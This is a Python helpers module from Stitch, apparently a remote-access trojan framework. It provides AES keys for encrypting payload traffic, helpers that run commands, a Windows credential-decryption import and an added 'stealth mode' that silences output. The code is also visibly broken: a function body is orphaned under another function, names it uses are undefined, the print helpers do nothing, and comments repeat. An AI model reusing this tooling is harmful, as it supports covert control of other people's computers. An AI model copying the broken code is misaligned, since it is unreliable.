#-*- coding: utf-8 -*-
#!/usr/bin/env python
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import os
import cmd
import sys
import zlib
import glob
import time
import math
import base64
import socket
import struct
import shutil
import sqlite3
import zipfile
import threading
from io import StringIO, BytesIO
import contextlib
import subprocess
import shlex
import configparser as ConfigParser
from time import sleep
from Crypto import Random
from getpass import getpass
from Crypto.Cipher import AES
from time import strftime, sleep
# TODO: Replace wildcard import with specific imports
# TODO: Replace wildcard import with specific imports
# TODO: Replace wildcard import with specific imports
from .Stitch_Vars.globals import banner, st_config, st_tag, st_aes_lib, aes_abbrev, aes_encoded, configuration_path
# TODO: Replace wildcard import with specific imports
# TODO: Replace wildcard import with specific imports
# TODO: Replace wildcard import with specific imports
from .Stitch_Vars.st_aes import secret
from colorama import Fore, Back, Style, init, deinit, reinit

# Global stealth mode flag
STEALTH_MODE = os.environ.get('ELITE_STEALTH', 'false').lower() == 'true'

if sys.platform.startswith('win'):
    init()
    import readline
    try:
        import win32crypt
    except ImportError:
        pass
    p_bar = "="
    temp = 'C:\\Windows\\Temp\\'
    readline.parse_and_bind("tab: complete")
else:
    temp = '/tmp/'
    import readline
    import rlcompleter
    p_bar = '█'
    if 'libedit' in readline.__doc__:
        readline.parse_and_bind("bind ^I rl_complete")
    else:
        readline.parse_and_bind("tab: complete")

if configuration_path not in sys.path:
    sys.path.append(configuration_path)

aes_lib = ConfigParser.ConfigParser()
aes_lib.read(st_aes_lib)
if aes_abbrev not in aes_lib.sections():
    aesfile = open(st_aes_lib,'w')
    aes_lib.add_section(aes_abbrev)
    aes_lib.set(aes_abbrev, 'aes_key', aes_encoded)
    aes_lib.write(aesfile)
    aesfile.close()

def run_command(command):
    try:
        # Normalize to list of args; never use a shell
        if isinstance(command, str):
            if windows_client():
                args = shlex.split(command, posix=False)
                cmd_list = ['cmd', '/c'] + args if args else ['cmd', '/c']
            else:
                cmd_list = shlex.split(command)
        else:
            cmd_list = list(command)

        result = subprocess.run(
            cmd_list,
            shell=False,
            capture_output=True,
            text=True,
            timeout=60
        )

        if result.returncode == 0:
            return result.stdout if result.stdout else '[+] Command successfully executed.\n'
        error_text = result.stderr if result.stderr else result.stdout
        return "[!] {}".format((error_text or '').strip())
    except subprocess.TimeoutExpired:
        return "[!] Command timed out"
    except KeyboardInterrupt:
        return "[!] Command interrupted"
    except Exception as e:
        return "[!] {}".format(str(e))

def start_command(command):
    try:
        if isinstance(command, str):
            if windows_client():
                args = shlex.split(command, posix=False)
                cmd_list = ['cmd', '/c'] + args if args else ['cmd', '/c']
            else:
                # Drop background token if present
                args = [tok for tok in shlex.split(command) if tok != '&']
                cmd_list = args
        else:
            args = [tok for tok in list(command) if tok != '&']
            if windows_client():
                cmd_list = ['cmd', '/c'] + args
            else:
                cmd_list = args

        subprocess.Popen(
            cmd_list,
            stdin=None,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            close_fds=True,
            shell=False
        )
        return '[+] Command successfully started.\n'
    except Exception as e:
        return '[!] {}\n'.format(str(e))

def no_error(cmd_output):
    if isinstance(cmd_output, bytes):
        try:
            cmd_output = cmd_output.decode('utf-8')
        except Exception:
            cmd_output = cmd_output.decode('latin-1')
    if cmd_output.startswith("ERROR:") or cmd_output.startswith("[!]"):
        return False
    else:
        return True

def encrypt(raw, aes_key=secret):
    if isinstance(raw, str):
        raw = raw.encode('utf-8')
    iv = Random.new().read( AES.block_size )
    cipher = AES.new(aes_key, AES.MODE_CFB, iv )
    return (base64.b64encode( iv + cipher.encrypt( raw ) ) )

def decrypt(enc, aes_key=secret):
    enc = base64.b64decode(enc)
    iv = enc[:16]
    cipher = AES.new(aes_key, AES.MODE_CFB, iv )
    return cipher.decrypt( enc[16:] )

def show_aes():
    """Display the current AES key for payload communication"""
    print('=== Stitch AES Key ===')
    print(f'   {aes_encoded}')
    print('[*] Copy and add this key to another system running Stitch to '
          'enable communication from payloads created on this system.\n')

def add_aes(key):
    aes_lib = ConfigParser.ConfigParser()
    aes_lib.read(st_aes_lib)
    if len(key) != 44:
        print('[!] Invalid AES key. Keys must be 32 bytes after decryption.\n')
        return False
    else:
        try:
            decr_key = base64.b64decode(key)
        except Exception as e:
            err = "[!] Decryption error: {}\n".format(str(e))
    # st_print(err)
        else:
            if len(decr_key) != 32:
                print('[!] Invalid AES key. Keys must be 32 bytes after decryption.\n')
                return False
            else:
                aes_abbrev = '{}{}{}{}{}{}{}{}{}{}{}{}{}'.format(
                    key[21],key[0],key[1],key[43],key[5],key[13],key[7],key[24],key[31],
                    key[35],key[16],key[39],key[28])
                sec_exists = False
                if aes_abbrev in aes_lib.sections():
                    sec_exists = True
                    # Getting a key that is almost exactly like one you already
                    # have is unlikely, this is just a precaution
                    if aes_lib.get(aes_abbrev,'aes_key') == key:
                        pass
    # st_print('[*] The AES key has already been added to this system.\n')
                        return
                aesfile = open(st_aes_lib,'w')
                if not sec_exists:
                    aes_lib.add_section(aes_abbrev)
                aes_lib.set(aes_abbrev, 'aes_key', key)
                aes_lib.write(aesfile)
                aesfile.close()
    # st_print('[+] Successfully added "{}" to the AES key library\n'.format(key))
                aes_lib.read(st_aes_lib)

def windows_client(system = sys.platform):
    if system.startswith('win'):
        return True
    else:
        return False

def osx_client(system = sys.platform):
    if system.startswith('darwin'):
        return True
    else:
        return False

def linux_client(system = sys.platform):
    if system.startswith('linux'):
        return True
    else:
        return False

    # def st_print(text):
    """Stealth-aware print function - primary output function"""
    if not STEALTH_MODE:
        # Normal operation - print to console
        print(text)
    else:
        # Stealth mode - silent operation
        pass
    if text.startswith('[+]'):
        text = '\n{}'.format(text)
        print_green(text)
        st_log.info(text[5:].strip())
    elif text.startswith('[*]'):
        text = '\n{}'.format(text)
        print_yellow(text)
    elif text.startswith('==='):
        text = '\n{}'.format(text)
        print_cyan(text)
    elif text.startswith('[-]') or text.startswith('[!]') or text.startswith('ERROR'):
        text = '\n{}'.format(text)
        print_red(text)
        if text.startswith('\n[-]'):
            st_log.info(text[5:].strip())
        if text.startswith('\n[!]'):
            st_log.error(text[5:].strip())
        if text.startswith('\nERROR'):
            st_log.error(text[9:].strip())
    else:
        text = '\n{}'.format(text)
    # print(text)
def print_yellow(string):
    if windows_client(): reinit()
    # print (Fore.YELLOW + Style.BRIGHT + string + Style.RESET_ALL)
    if windows_client(): deinit()

def print_blue(string):
    if windows_client(): reinit()
    # print (Fore.BLUE + Style.BRIGHT + string + Style.RESET_ALL)
    if windows_client(): deinit()

def print_cyan(string):
    if windows_client(): reinit()
    # print (Fore.CYAN + Style.BRIGHT + string + Style.RESET_ALL)
    if windows_client(): deinit()

def print_green(string):
    if windows_client(): reinit()
    # print (Fore.GREEN + Style.BRIGHT + string + Style.RESET_ALL)
    if windows_client(): deinit()

def print_red(string):
    if windows_client(): reinit()
    # print (Fore.RED + Style.BRIGHT + string + Style.RESET_ALL)
    if windows_client(): deinit()

def get_cwd():
    path = os.getcwd()
    path = path + '>'
    return path

def display_banner():
    clear_screen()
    # print(banner)
def clear_screen():
    if windows_client():
        subprocess.run(['cmd', '/c', 'cls'], shell=False, capture_output=True)
    else:
        subprocess.run(['clear'], shell=False, capture_output=True)

def check_int(val):
    try:
        is_int = int(val)
        return True
    except ValueError:
        # print("{} is not a valid number.").format(val)
        return False

def append_slash_if_dir(p):
    if p and os.path.isdir(p) and p[-1] != os.sep:
        return p + os.sep
    else:
        return p

def find_patterns(text, line, begidx, endidx, search):
    f = []
    before_arg = line.rfind(" ", 0, begidx)
    if before_arg == -1:
        return # arg not found

    fixed = line[before_arg+1:begidx]  # fixed portion of the arg
    arg = line[before_arg+1:endidx]

    for n in search:
        if n.startswith(arg):
            f.append(n)
    return f

def find_path(text, line, begidx, endidx, \
                dir_only=False, files_only=False, exe_only=False,\
                py_only=False, uploads=False, all_dir=False):
    cur_dir = os.getcwd()
    before_arg = line.rfind(" ", 0, begidx)
    if before_arg == -1:
        return # arg not found

    fixed = line[before_arg+1:begidx]  # fixed portion of the arg
    arg = line[before_arg+1:endidx]

    if uploads:
        os.chdir(uploads_path)
    pattern = arg + '*'

    completions = []
    for path in glob.glob(pattern):
        if dir_only:
            if os.path.isdir(path):
                path = append_slash_if_dir(path)
                completions.append(path.replace(fixed, "", 1))
        elif files_only:
            if not os.path.isdir(path):
                completions.append(path.replace(fixed, "", 1))
        elif exe_only:
            if not os.path.isdir(path):
                if path.endswith('.exe') or path.endswith('.py'):
                    completions.append(path.replace(fixed, "", 1))
        elif py_only:
            if not os.path.isdir(path):
                if path.endswith('.py'):
                    completions.append(path.replace(fixed, "", 1))
        elif all_dir:
            if os.path.isdir(path):
                path = append_slash_if_dir(path)
            completions.append(path.replace(fixed, "", 1))

    os.chdir(cur_dir)
    return completions

def find_completion(text,opt_list):
    option = []
    for n in opt_list:
        if text:
            if n.startswith(text): option.append(n)
        else:
            option.append(n)
    return option

class progress_bar():
    def __init__(self,size):
        self.size     = int(size)
        self.tick     = 0
        self.tracker  = 0
        self.progress = 0
        self.bar_size = 50
        self.percent  = self.size/self.bar_size

    def file_info(self):
        file_size = convertSize(float(self.size))
    # st_print('Total Size: {} ({} bytes)'.format(file_size,self.size))
        self.display()

    def display(self):
        p_output = "[{}] %0".format(" " * self.bar_size)
        sys.stdout.write(p_output)
        sys.stdout.flush()
        sys.stdout.write("\b" * (len(p_output)))

    def increment(self, inc_track=1024, inc_prog=1024, file_inc=True):
        self.tracker  += inc_track
        self.progress += inc_prog
        if file_inc:
            while self.progress >= self.percent and self.tracker < self.size:
                self.progress = self.progress - self.percent
                self.tick += 1
                space = self.bar_size - self.tick
                total_percentage = 2 * self.tick
                p_output = "[{}{}] %{}".format(p_bar * self.tick, ' ' * space, total_percentage)
                sys.stdout.write(p_output)
                sys.stdout.flush()
                sys.stdout.write("\b" * (len(p_output)))
        else:
            self.tick = int((float(self.progress)/float(self.size)) * float(self.bar_size))
            space = self.bar_size - self.tick
            total_percentage = 2 * self.tick
            p_output = "[{}{}] %{}".format(p_bar * self.tick, ' ' * space, total_percentage)
            sys.stdout.write(p_output)
            sys.stdout.flush()
            sys.stdout.write("\b" * (len(p_output)))

    def complete(self):
        sys.stdout.write("[{}] %100\n".format(p_bar * self.bar_size))
        sys.stdout.flush()

def print_border(length,border):
    """Print a border of specified length using border character"""
    print(border * length)

def st_logger(resp,log_path,log_name,verbose=True):
    if no_error(resp):
        i = 1
        log = os.path.join(log_path,'{}.log'.format(log_name))
        while os.path.exists(log):
            new_log_name = '{} ({}).log'.format(log_name,i)
            log = os.path.join(log_path,new_log_name)
            i += 1
    # if verbose: st_print("[+] Output has been written to {}\n".format(log))
        with open(log,'w') as l:
            l.write(resp)

#http://stackoverflow.com/questions/2828953/silence-the-stdout-of-a-function-in-python-without-trashing-sys-stdout-and-resto
@contextlib.contextmanager
def nostdout():
    '''Prevent print to stdout, but if there was an error then catch it and
    print the output before raising the error.'''
    saved_stdout = sys.stdout
    sys.stdout = BytesIO()
    try:
        yield
    except Exception:
        saved_output = sys.stdout
        sys.stdout = saved_stdout
    # print(saved_output.getvalue())
        raise
    sys.stdout = saved_stdout

def st_print(text):
    """Stealth-aware print function - primary output function"""
    if not STEALTH_MODE:
        # Normal operation - print to console
        print(text)
    else:
        # Stealth mode - silent operation
        pass

#http://stackoverflow.com/questions/5194057/better-way-to-convert-file-sizes-in-python
def convertSize(size):
   if (size == 0):
       return '0 Bytes'
   size_name = ("Bytes", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB")
   i = int(math.floor(math.log(size,1024)))
   p = math.pow(1024,i)
   s = round(size/p,2)
   return '{} {}'.format(s,size_name[i])

def zipdir(path, zipn):
    for root, dirs, files in os.walk(path):
        for file in files:
            zipn.write(os.path.join(root, file))
